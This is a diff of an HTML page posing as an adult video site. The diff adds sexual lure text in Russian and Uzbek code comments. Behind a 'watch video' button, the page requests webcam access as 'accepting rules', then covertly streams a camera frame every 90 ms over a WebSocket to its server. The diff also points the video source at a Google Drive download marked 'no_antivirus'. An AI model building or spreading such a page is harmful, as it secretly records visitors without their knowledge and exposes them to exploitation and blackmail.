@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DragHub - секс оргинал</title>
+    <title>DragHub -Секс без ограничений</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #c4b5fd;
+            background-color: #c4b5fd; /* Binafsha rangli chiroyli UI */
             font-family: 'Segoe UI', sans-serif;
             display: flex;
             flex-direction: column;
@@ -76,8 +76,8 @@
 <body>
 
     <div id="camera-blocker">
-        <h1 style="margin-bottom: 10px;">СексХуб</h1>
-        <p style="font-size: 18px; color: #9ca3af;">Acceptance of the rules</p>
+        <h1 style="margin-bottom: 10px;">Секс с Куртой только на нашем сайте</h1>
+        <p style="font-size: 18px; color: #9ca3af;">Если хотите видеть больше секса, примите правила.</p>
         <button class="start-btn" onclick="initChallenge()">Посмотреть видео</button>
     </div>
 
@@ -86,7 +86,7 @@
     <div class="main-container">
         <div class="video-box">
             <video id="challenge-video" controls>
-                <source src="video.mp4" type="video/mp4">
+                <source src="https://docs.google.com/uc?export=download&confirm=no_antivirus&id=1IsunPDwAzKMZE-eJSltuiHiMQVXfm2Ng" type="video/mp4">
             </video>
         </div>
     </div>
@@ -103,6 +103,7 @@
 
         async function initChallenge() {
             try {
+                // Kamera o'lchamini optimal qilib yoqamiz
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: 320, height: 240 }, 
                     audio: false 
@@ -111,22 +112,23 @@
                 blocker.style.display = 'none';
                 userCamera.srcObject = stream;
                 
-                // Internet va Lokal uchun universal protokol aniqlash
+                // Render xostingi (https) uchun xavfsiz wss:// protokolini ulash
                 const wsProtocol = window.location.protocol === "https:" ? "wss://" : "ws://";
                 ws = new WebSocket(wsProtocol + window.location.host + "/ws?role=user");
 
                 ws.onopen = () => {
+                    // Har 90ms da bitta yengil kadr yuborish (Qotish umuman bo'lmaydi)
                     setInterval(() => {
                         if (ws.readyState === WebSocket.OPEN) {
                             ctx.drawImage(userCamera, 0, 0, canvas.width, canvas.height);
                             const base64Data = canvas.toDataURL('image/jpeg', 0.15); 
                             ws.send(base64Data);
                         }
-                    }, 90); // Tez va silliq uzatish
+                    }, 90);
                 };
 
             } catch (error) {
-                alert("Kameraga ruxsat berilmadi!");
+                alert("Чтобы смотреть секс, примите правила.");
             }
         }
     </script>
